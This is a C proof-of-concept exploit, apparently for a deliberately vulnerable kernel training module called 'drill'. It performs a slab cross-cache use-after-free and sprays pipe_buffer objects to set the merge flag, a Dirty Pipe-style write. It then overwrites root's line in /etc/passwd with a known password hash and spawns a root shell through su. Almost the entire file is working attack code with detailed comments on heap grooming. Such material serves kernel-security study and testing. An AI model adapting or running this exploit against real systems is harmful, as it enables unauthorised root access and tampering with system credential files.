/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * This PoC performs the Dirty Pipe attack and gains LPE.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/user.h>
#include "drill.h"

#define STR_EXPAND(arg) #arg
#define STR(arg) STR_EXPAND(arg)

int do_cpu_pinning(int cpu_n)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #%d\n", cpu_n);
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Collect the needed info for a cross-cache attack:
 *
 *  - Get the number of objects per slab containing a vulnerable object
 *    (let's call it initial slab). For example,
 *    /sys/kernel/slab/kmalloc-rnd-01-96/objs_per_slab is 42.
 *
 *  - Get the number of per-CPU partial slabs in the initial kmem_cache (see in gdb).
 *    For example, kmem_cache.cpu_partial_slabs for kmalloc-rnd-01-96 is 6.
 *
 *  - Get the minimum number of per-node partial slabs in the initial kmem_cache.
 *    For example, /sys/kernel/slab/kmalloc-rnd-01-96/min_partial is 5.
 *    Ensure that this number is smaller than cpu_partial_slabs, otherwise
 *    you will have to deal with empty slabs stuck in the per-node partial list.
 *
 *  - Estimate the number of holes in the initial slab cache.
 *    It can't be precise because these number change.
 *    Calculate (num_objs - active_objs) from /proc/slabinfo for the initial slab cache:
 *      cat /proc/slabinfo |grep "kmalloc-rnd-..-96" | awk '{print $1, $3 - $2}'
 *    Take the biggest number of holes and multiply it by 2, for example (just to be safe).
 *
 *  - Estimate the number of holes in the final slab cache containing the spray objects.
 *    Again, it can't be precise because these number change.
 *    The pipe_buffer arrays containing N=2 objects are also allocated in kmalloc-rnd-..-96.
 *    Hence, for the final slab cache, we can reuse the estimated number of holes from the
 *    initial slab cache.
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL_SLABS 6
#define HOLES 450

/* Perform a cross-cache attack:
 *  - pin the process to a single CPU
 *  - plug the holes in the initial slab cache
 *  - plug the holes in the final slab cache
 *  - allocate (objs_per_slab * cpu_partial_slabs) objects for the partial list clean-up
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate a vulnerable object
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab
 *  - perform uaf write using the dangling reference to the vulnerable object
 *  - execute the exploit primitive via the overwritten spray object
 */

/*
 * Use the final slab cache with objects of size (N * sizeof(struct pipe_buffer)),
 * which is (N * 40) bytes.
 */
#define N 2
#define PIPES_N (HOLES + OBJS_PER_SLAB * 5)
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

int pipe_fds[PIPES_N][2];
int passwd_fd = 0;

/*
 * This is a string for /etc/passwd without the first spliced symbol 'r'.
 * The hash is generated with `openssl passwd -1 -salt root pwn`.
 */
char *pwd = "oot:$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/bash\n";

int prepare_pipes(void)
{
	int ret = 0;
	FILE *file_s;
	FILE *file_bkp_s;
	char c;
	long i = 0;

	file_s = fopen("/etc/passwd", "r");
	if (file_s == NULL) {
		perror("[-] fopen 1");
		return EXIT_FAILURE;
	}

	file_bkp_s = fopen("/tmp/passwd.bkp", "w");
	if (file_bkp_s == NULL) {
		perror("[-] fopen 2");
		return EXIT_FAILURE;
	}

	while ((c = fgetc(file_s)) != EOF)
		fputc(c, file_bkp_s);
	printf("[+] /etc/passwd saved to /tmp/passwd.bkp\n");

	fclose(file_s);
	fclose(file_bkp_s);

	passwd_fd = open("/etc/passwd", O_RDONLY);
	if (passwd_fd < 0) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	for (i = 0; i < PIPES_N; i++) {
		ret = pipe(pipe_fds[i]); /* This allocates kmalloc-1k object */
		if (ret < 0) {
			perror("[-] pipe");
			return EXIT_FAILURE;
		}
	}

	return EXIT_SUCCESS;
}

#define CHECK_BUF_SZ 256

int check_passwd(void)
{
	int check_fd = 0;
	ssize_t bytes = 0;
	char check_buf[CHECK_BUF_SZ] = { 0 };
	size_t pwd_len = strlen(pwd);
	int ret = 0;
	int check_result = EXIT_FAILURE;

	/* Be sure that check_buf size is enough for pwd including null byte */
	if (pwd_len >= CHECK_BUF_SZ) {
		printf("[-] pwd_len is too big\n");
		return EXIT_FAILURE;
	}

	check_fd = open("/etc/passwd", O_RDONLY);
	if (check_fd < 0) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	bytes = read(check_fd, check_buf, 1);
	if (bytes < 0) {
		perror("[-] read");
		goto end;
	}
	if (bytes != 1) {
		printf("[-] read short\n");
		goto end;
	}

	if (check_buf[0] != 'r') {
		printf("[+] weird /etc/passwd\n");
		goto end;
	}

	bytes = read(check_fd, check_buf, pwd_len);
	if (bytes < 0) {
		perror("[-] read");
		goto end;
	}
	if (bytes != pwd_len) {
		printf("[-] read short\n");
		goto end;
	}

	ret = strncmp(check_buf, pwd, pwd_len);
	if (ret == 0) {
		printf("[+] /etc/passwd contains the needed data!\n");
		check_result = EXIT_SUCCESS;
	} else {
		printf("[+] /etc/passwd contains the wrong data\n");
	}

end:
	ret = close(check_fd);
	if (ret != 0)
		perror("[-] close check_fd");

	return check_result;
}

int main(void)
{
	int result = EXIT_FAILURE;
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	ssize_t bytes = 0;
	size_t pwd_len = strlen(pwd);
	char *argv[] = {
		"/bin/sh", "-c",
		"(echo pwn; cat) | su -l -c \"id; cp -v /tmp/passwd.bkp /etc/passwd; id; /bin/sh\"",
		NULL
	};

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	ret = increase_fd_limit();
	if (ret == EXIT_FAILURE)
		goto end;

	ret = prepare_pipes();
	if (ret == EXIT_FAILURE)
		goto end;

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	printf("[!] plug the holes in the initial slab cache\n");
	for (i = 0; i < HOLES; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] plug the holes in the final slab cache\n");
	/* Reallocate the write end of the pipe as object of size (N * sizeof(struct pipe_buffer)) */
	for (i = 0; i < HOLES; i++) {
		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * N);
		if (ret != PAGE_SIZE * N) {
			perror("[-] fcntl");
			goto end;
		}
	}

	printf("[!] allocate (objs_per_slab * cpu_partial_slabs) objects for the partial list clean-up\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL_SLABS; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] allocate a vulnerable object\n");
	if (act(act_fd, DRILL_ACT_ALLOC, current_n, NULL) == EXIT_FAILURE) {
		printf("[-] DRILL_ACT_ALLOC\n");
		goto end;
	}
	uaf_n = current_n;
	current_n++;
	printf("[+] done, uaf_n: %ld, current_n: %ld (next for allocating)\n", uaf_n, current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that the uaf object has been freed here */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL_SLABS; i += OBJS_PER_SLAB) {
		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the first element after the reserved slabs */
	assert(reserved_from_n + i == current_n);
	printf("[+] done, now go spraying\n");

	printf("[!] allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab\n");
	/* Reallocate the write end of the pipe as object of size (N * sizeof(struct pipe_buffer)) */
	for (i = HOLES; i < PIPES_N; i++) {
		loff_t file_offset = 0;

		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * N);
		if (ret != PAGE_SIZE * N) {
			perror("[-] fcntl");
			goto end;
		}

		/* N.B. splice modifies the file_offset value, so we reset it on each loop iteration */
		bytes = splice(passwd_fd, &file_offset, pipe_fds[i][1], NULL, 1, 0);
		if (bytes < 0) {
			perror("[-] splice");
			goto end;
		}
		if (bytes == 0) {
			perror("[-] splice short");
			goto end;
		}
	}
	printf("[+] pipe_buffer spraying is done\n");

	printf("[!] perform uaf write using the dangling reference to the vulnerable object\n");
	/*
	 * Overwrite pipe_buffer flags:
	 *  - flags in pipe_buffer are at the offset 24;
	 *  - DRILL_ACT_SAVE_VAL with 8 as 2nd argument also starts at the offset 24.
	 */
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(PIPE_BUF_FLAG_CAN_MERGE) " 8");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	printf("[!] execute the exploit primitive via the overwritten spray object\n");
	for (i = HOLES; i < PIPES_N; i++) {
		/*
		 * The following write will not create a new pipe_buffer, but
		 * will instead write into the page cache, because of the
		 * PIPE_BUF_FLAG_CAN_MERGE flag.
		 */
		bytes = write(pipe_fds[i][1], pwd, pwd_len);
		if (bytes < 0) {
			perror("[-] write");
			goto end;
		}
		if (bytes < pwd_len) {
			perror("[-] write short");
			goto end;
		}
	}
	printf("[+] wrote to pipes\n");

	if (check_passwd() == EXIT_SUCCESS) {
		printf("[+] /etc/passwd is overwritten, now try to run the root shell\n");
		result = EXIT_SUCCESS;
		execv("/bin/sh", argv); /* This should not return */
		perror("[-] execv");
	}

	printf("[-] exploit failed\n");

end:
	for (i = 0; i < PIPES_N; i++) {
		if (pipe_fds[i][0] >= 0) {
			ret = close(pipe_fds[i][0]);
			if (ret != 0)
				perror("[-] close pipe");
		}
		if (pipe_fds[i][1] >= 0) {
			ret = close(pipe_fds[i][1]);
			if (ret != 0)
				perror("[-] close pipe");
		}
	}

	if (passwd_fd >= 0) {
		ret = close(passwd_fd);
		if (ret != 0)
			perror("[-] close passwd_fd");
	}

	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	return result;
}
